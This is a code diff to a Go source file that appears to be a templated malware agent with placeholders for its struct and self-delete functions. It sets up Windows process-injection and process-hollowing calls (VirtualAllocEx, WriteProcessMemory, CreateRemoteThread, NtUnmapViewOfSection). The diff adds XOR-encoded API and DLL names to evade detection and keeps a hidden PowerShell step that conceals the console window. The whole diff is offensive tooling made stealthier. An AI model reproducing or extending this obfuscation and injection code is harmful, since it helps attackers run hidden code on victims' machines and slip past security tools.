@@ -23,6 +23,15 @@ import (
 	"github.com/fernet/fernet-go"
 )
 
+// Obfuscation function for runtime deobfuscation
+func deobfuscateString(obfuscated []byte, key byte) string {
+	result := make([]byte, len(obfuscated))
+	for i := 0; i < len(obfuscated); i++ {
+		result[i] = obfuscated[i] ^ key
+	}
+	return string(result)
+}
+
 const (
 	PROCESS_CREATE_THREAD = 0x0002
 	PROCESS_QUERY_INFORMATION = 0x0400
@@ -53,23 +62,50 @@ const (
 )
 
 var (
-	kernel32 = syscall.NewLazyDLL("kernel32.dll")
-	ntdll = syscall.NewLazyDLL("ntdll.dll")
-	procOpenProcess = kernel32.NewProc("OpenProcess")
-	procVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
-	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
-	procVirtualProtectEx = kernel32.NewProc("VirtualProtectEx")
-	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
-	procProcess32First = kernel32.NewProc("Process32FirstW")
-	procProcess32Next = kernel32.NewProc("Process32NextW")
-	procCreateProcess = kernel32.NewProc("CreateProcessW")
-	procResumeThread = kernel32.NewProc("ResumeThread")
-	procSuspendThread = kernel32.NewProc("SuspendThread")
-	procGetThreadContext = kernel32.NewProc("GetThreadContext")
-	procSetThreadContext = kernel32.NewProc("SetThreadContext")
-	procReadProcessMemory = kernel32.NewProc("ReadProcessMemory")
-	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
+	// Obfuscated DLL names and API functions
+	obfuscatedKernel32DLL = []byte{0x29, 0x27, 0x30, 0x2c, 0x27, 0x2e, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "kernel32.dll"
+	obfuscatedNtdllDLL = []byte{0x2c, 0x36, 0x26, 0x2e, 0x2e, 0x6c, 0x26, 0x2e, 0x2e} // "ntdll.dll"
+	obfuscatedUser32DLL = []byte{0x37, 0x31, 0x27, 0x30, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "user32.dll"
+	obfuscatedOpenProcess = []byte{0x0d, 0x32, 0x27, 0x2c, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31} // "OpenProcess"
+	obfuscatedVirtualAllocEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x03, 0x2e, 0x2e, 0x2d, 0x21, 0x07, 0x3a} // "VirtualAllocEx"
+	obfuscatedWriteProcessMemory = []byte{0x15, 0x30, 0x2b, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "WriteProcessMemory"
+	obfuscatedCreateRemoteThread = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x10, 0x27, 0x2f, 0x2d, 0x36, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "CreateRemoteThread"
+	obfuscatedVirtualProtectEx = []byte{0x14, 0x2b, 0x30, 0x36, 0x37, 0x23, 0x2e, 0x12, 0x30, 0x2d, 0x36, 0x27, 0x21, 0x36, 0x07, 0x3a} // "VirtualProtectEx"
+	obfuscatedCreateToolhelp32Snapshot = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x16, 0x2d, 0x2d, 0x2e, 0x2a, 0x27, 0x2e, 0x32, 0x71, 0x70, 0x11, 0x2c, 0x23, 0x32, 0x31, 0x2a, 0x2d, 0x36} // "CreateToolhelp32Snapshot"
+	obfuscatedProcess32First = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x04, 0x2b, 0x30, 0x31, 0x36, 0x15} // "Process32FirstW"
+	obfuscatedProcess32Next = []byte{0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x71, 0x70, 0x0c, 0x27, 0x3a, 0x36, 0x15} // "Process32NextW"
+	obfuscatedCreateProcess = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x15} // "CreateProcessW"
+	obfuscatedResumeThread = []byte{0x10, 0x27, 0x31, 0x37, 0x2f, 0x27, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "ResumeThread"
+	obfuscatedSuspendThread = []byte{0x11, 0x37, 0x31, 0x32, 0x27, 0x2c, 0x26, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26} // "SuspendThread"
+	obfuscatedGetThreadContext = []byte{0x05, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "GetThreadContext"
+	obfuscatedSetThreadContext = []byte{0x11, 0x27, 0x36, 0x16, 0x2a, 0x30, 0x27, 0x23, 0x26, 0x01, 0x2d, 0x2c, 0x36, 0x27, 0x3a, 0x36} // "SetThreadContext"
+	obfuscatedReadProcessMemory = []byte{0x10, 0x27, 0x23, 0x26, 0x12, 0x30, 0x2d, 0x21, 0x27, 0x31, 0x31, 0x0f, 0x27, 0x2f, 0x2d, 0x30, 0x3b} // "ReadProcessMemory"
+	obfuscatedNtUnmapViewOfSection = []byte{0x0c, 0x36, 0x17, 0x2c, 0x2f, 0x23, 0x32, 0x14, 0x2b, 0x27, 0x35, 0x0d, 0x24, 0x11, 0x27, 0x21, 0x36, 0x2b, 0x2d, 0x2c} // "NtUnmapViewOfSection"
+	obfuscatedGetConsoleWindow = []byte{0x05, 0x27, 0x36, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "GetConsoleWindow"
+	obfuscatedShowWindow = []byte{0x11, 0x2a, 0x2d, 0x35, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "ShowWindow"
+
+	// XOR key for deobfuscation
+	obfuscationKey = byte(0x42)
+
+	// DLL and procedure handles
+	kernel32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedKernel32DLL, obfuscationKey))
+	ntdll = syscall.NewLazyDLL(deobfuscateString(obfuscatedNtdllDLL, obfuscationKey))
+	user32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedUser32DLL, obfuscationKey))
+	procOpenProcess = kernel32.NewProc(deobfuscateString(obfuscatedOpenProcess, obfuscationKey))
+	procVirtualAllocEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualAllocEx, obfuscationKey))
+	procWriteProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedWriteProcessMemory, obfuscationKey))
+	procCreateRemoteThread = kernel32.NewProc(deobfuscateString(obfuscatedCreateRemoteThread, obfuscationKey))
+	procVirtualProtectEx = kernel32.NewProc(deobfuscateString(obfuscatedVirtualProtectEx, obfuscationKey))
+	procCreateToolhelp32Snapshot = kernel32.NewProc(deobfuscateString(obfuscatedCreateToolhelp32Snapshot, obfuscationKey))
+	procProcess32First = kernel32.NewProc(deobfuscateString(obfuscatedProcess32First, obfuscationKey))
+	procProcess32Next = kernel32.NewProc(deobfuscateString(obfuscatedProcess32Next, obfuscationKey))
+	procCreateProcess = kernel32.NewProc(deobfuscateString(obfuscatedCreateProcess, obfuscationKey))
+	procResumeThread = kernel32.NewProc(deobfuscateString(obfuscatedResumeThread, obfuscationKey))
+	procSuspendThread = kernel32.NewProc(deobfuscateString(obfuscatedSuspendThread, obfuscationKey))
+	procGetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedGetThreadContext, obfuscationKey))
+	procSetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedSetThreadContext, obfuscationKey))
+	procReadProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedReadProcessMemory, obfuscationKey))
+	procNtUnmapViewOfSection = ntdll.NewProc(deobfuscateString(obfuscatedNtUnmapViewOfSection, obfuscationKey))
 )
 
 // PROCESSENTRY32 structure for process enumeration
@@ -1962,7 +1998,12 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 func {AGENT_HIDE_CONSOLE_FUNC}() {
 	// Hide console window on Windows
 	if runtime.GOOS == "windows" {
-		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }")
+		// Deobfuscate DLL names for PowerShell command
+		kernel32Name := deobfuscateString(obfuscatedKernel32DLL, obfuscationKey)
+		user32Name := deobfuscateString(obfuscatedUser32DLL, obfuscationKey)
+
+		psCode := fmt.Sprintf("try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"%s\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"%s\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }", kernel32Name, user32Name)
+		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCode)
 		_ = cmd.Run() // Run command but ignore errors
 	}
 }
